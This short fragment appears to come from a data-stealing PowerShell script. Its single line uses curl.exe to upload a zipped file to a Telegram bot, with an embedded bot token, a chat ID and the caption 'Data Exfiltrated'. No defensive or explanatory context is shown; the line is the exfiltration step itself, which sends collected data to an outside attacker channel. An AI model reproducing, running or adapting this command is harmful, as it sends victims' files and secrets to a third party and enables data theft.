...
curl.exe -X POST https://api.telegram.org/bot7442026925:AAEkeXaAL7rGvztaF-zo1N25-ICdZWIxI2o/sendDocument -F chat_id=5837648640 -F document=@"$ZipFile" -F caption="Data Exfiltrated"
